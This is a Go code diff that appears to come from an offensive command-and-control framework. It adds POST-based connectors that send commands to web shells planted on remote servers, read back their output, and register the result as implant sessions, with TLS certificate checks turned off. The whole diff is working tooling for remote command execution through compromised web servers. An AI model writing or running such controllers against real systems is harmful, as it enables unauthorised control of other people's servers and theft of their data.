@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"net/url"
 	"strconv"
+	"strings"
 )
 
 // StartConnector - Creates a connector based on parameters generated via the "connector start" subcommand.
@@ -46,7 +47,7 @@ func StartConnector(id int, rhost string, rport int, protocol string, requestTyp
 
 		resp, err := client.Get(connectString)
 		if err != nil {
-			return "protocol not supported for bind connection execution", errors.New("protocol not supported for bind connection execution")
+			return "problem reading GET request response", errors.New("problem reading GET request response")
 		}
 		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
 			response := "Got a " + strconv.Itoa(resp.StatusCode) + " response, setting up session..."
@@ -60,7 +61,39 @@ func StartConnector(id int, rhost string, rport int, protocol string, requestTyp
 			return "the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode), errors.New("the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode))
 		}
 	} else if requestType == "POST" {
-		return "POST not implemented yet", errors.New("POST not implemented yet")
+
+		commandParse := strings.Replace(command, "=", "", -1)
+
+		data := url.Values{
+			commandParse: {""},
+		}
+
+		queryParse, err := url.ParseQuery(query)
+
+		if err != nil {
+			return "problem parsing extra query parameters for POST request", errors.New("problem parsing extra query parameters for POST request")
+		}
+
+		for k, v := range queryParse {
+			data.Add(string(k), strings.Join(v, ""))
+		}
+
+		resp, err := client.PostForm(connectString, data)
+
+		if err != nil {
+			return "problem reading POST request response", errors.New("problem reading POST request response")
+		}
+		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
+			response := "Got a " + strconv.Itoa(resp.StatusCode) + " response, setting up session..."
+			implant := RegisterImplant("Web", 0, nil)
+			RegisterSession(SessionID, protocol, implant, rhost, rport, command, query, requestType, shellpath)
+			newSession := SessionID - 1
+			BroadcastSession(strconv.Itoa(newSession))
+
+			return response, nil
+		} else {
+			return "the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode), errors.New("the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode))
+		}
 	} else {
 		return "the request type you specified is not implemented yet", errors.New("the request type you specified is not implemented yet")
 	}
@@ -73,17 +106,24 @@ func ExecuteConnection(rhost string, rport int, protocol string, path string, co
 
 	LogData("executing on session" + strconv.Itoa(ActiveSession) + ": " + command)
 
+	client := http.DefaultClient
+
+	if protocol == "HTTPS" {
+		protocol = "https://"
+		tr := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client = &http.Client{Transport: tr}
+
+	} else if protocol == "HTTP" {
+		protocol = "http://"
+	} else {
+		return "", errors.New("protocol specified not implemented by the connector")
+	}
+
 	if requestType == "GET" {
 
-		if protocol == "HTTPS" {
-			protocol = "https://"
-		} else if protocol == "HTTP" {
-			protocol = "http://"
-		} else {
-			return "", errors.New("protocol not supported for bind connection execution")
-		}
-
-		connectString := protocol + rhost + ":" + strconv.Itoa(rport) + "/" + path + "?" + commandQuery + url.QueryEscape(command) + query
+		connectString := protocol + rhost + "/" + path + "?" + commandQuery + url.QueryEscape(command) + query
 
 		resp, err := http.Get(connectString)
 		if err != nil {
@@ -106,7 +146,45 @@ func ExecuteConnection(rhost string, rport int, protocol string, path string, co
 		}
 
 	} else if requestType == "POST" {
-		return "", errors.New("POST not implemented yet")
+
+		connectString := protocol + rhost + "/" + path
+
+		commandParse := strings.Replace(commandQuery, "=", "", -1)
+
+		postParams := url.Values{
+			commandParse: {command},
+		}
+
+		queryParse, err := url.ParseQuery(query)
+
+		if err != nil {
+			return "", errors.New("problem parsing extra query parameters for POST request")
+		}
+
+		for k, v := range queryParse {
+			postParams.Add(string(k), strings.Join(v, ""))
+		}
+
+		resp, err := client.PostForm(connectString, postParams)
+
+		if err != nil {
+			return "", errors.New("problem assigning response from server")
+		}
+
+		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
+			SuccessColorBold.Println("executing command... ")
+
+			//We Read the response body on the line below.
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				return "", errors.New("couldn't read the response body")
+			}
+
+			//Convert the body to type string
+			data = string(body)
+		} else {
+			return "", errors.New("the shell is not responding as expected (might be dead), response code was: " + strconv.Itoa(resp.StatusCode))
+		}
 	} else {
 		return "", errors.New("the request type you specified is not implemented yet")
 	}
